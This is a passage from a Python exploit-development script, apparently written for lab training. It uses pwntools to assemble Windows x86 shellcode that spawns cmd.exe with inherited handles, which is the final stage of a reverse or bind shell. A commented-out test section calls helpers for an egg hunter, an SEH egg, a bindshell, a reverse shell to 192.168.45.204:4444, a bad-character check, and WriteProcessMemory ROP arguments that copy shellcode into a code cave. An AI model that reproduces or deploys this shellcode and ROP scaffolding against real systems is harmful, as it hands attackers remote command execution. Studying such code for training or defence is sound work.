    "   push esp                ;" # (arg) push pointer to cmd.exe
    "   pop ebx                 ;" # store pointer to "cmd.exe" in EBX
    "call_createProcessa:"
    "   mov eax, esp            ;" # mov esp to eax
    "   xor ecx, ecx            ;" # zero ecx
    "   mov cx, 0x390           ;" # move 0x390 into cx
    "   sub eax, ecx            ;" # subtract CX from eax to avoid null
    "   push eax                ;" # (arg) lpProcessInformation, pointer populated by call
    "   push edi                ;" # (arg) lpStartupInfo pointer
    "   xor eax, eax            ;" # zero eax
    "   push eax                ;" # (arg) lpCurrentDirectory->null
    "   push eax                ;" # (arg) lpEnvironment ->null
    "   push eax                ;" # (arg) dwCreationFlags->null
    "   inc eax                 ;" # eax=1
    "   push eax                ;" # (arg) bInheritHandles->1 (yes)
    "   dec eax                 ;" # eax = 0
    "   push eax                ;" # (arg) lpThreadAttributes->null
    "   push eax                ;" # (arg) lpProcessAtributes->null
    "   push ebx                ;" # (arg) lpCommandLine->"cmd.exe" ptr
    "   push eax                ;" # (arg) lpApplicationName->null
    "   call dword ptr [ebp+0x18];"# call CreateProcessA
    "call_terminate_process:" # terminate things neatly to avoid a hang 
    "   xor eax, eax        ;" # re-zero because calls populate eax
    "   push eax            ;" # (arg) uExitCode-> Null
    "   push 0xffffffff     ;" # (arg) hProcess -> current process pseudohandle
    "   call dword ptr [ebp+0x10];" # Call TerminateProcess
   )
       # create shellcode that can be sent (bytes)
    shellcode = pwn.asm(assembly)

    # OPCodes as a string
    hexString = binascii.hexlify(shellcode).decode('utf-8')
    pwn.info(f"OPCodes: {hexString}")
    pwn.info(f"Shellcode Length: {len(shellcode)}")
    # write to an executable ELF
    #myElf = pwn.ELF.from_assembly(assembly)
    #myElf.save('POC.elf')
    return shellcode


#############################
# test
#############################
#eggID = b"w00t"
#make_egg(eggID)
#make_egg_SEH(eggID)
#bindshell = make_bindshell("\\x00\\x0a\\x0d\\x25")
#custom_win_rshell("192.168.45.204","4444")

#print(findBadChars("\\x00\\x0a\\x0d\\x25",0x0a250000))
#base = 0x303000
#addr_WriteProcessMemory = 0x74862890
# call write process memory & copy shellcode
#writeProcessMemoryArgs = pwn.flat(
#        [
#            addr_WriteProcessMemory,
#            0x92c04 + base, # shellcode addr / codecave
#            0xffffffff,     # process handle
#            0x92c04 + base, # code cave address
#            0x41414141,     # dummy lpBuffer (stackAddr)
#            0x42424242,     # dummy nSize
#            0xe401c + base, # lpNumberOfBytesWritten
#            b"A"*12
#        ]
#        )
#print(binascii.hexlify(writeProcessMemoryArgs))
#byteStreamCheck("\\x00\\x0a\\x0d\\x25",writeProcessMemoryArgs)
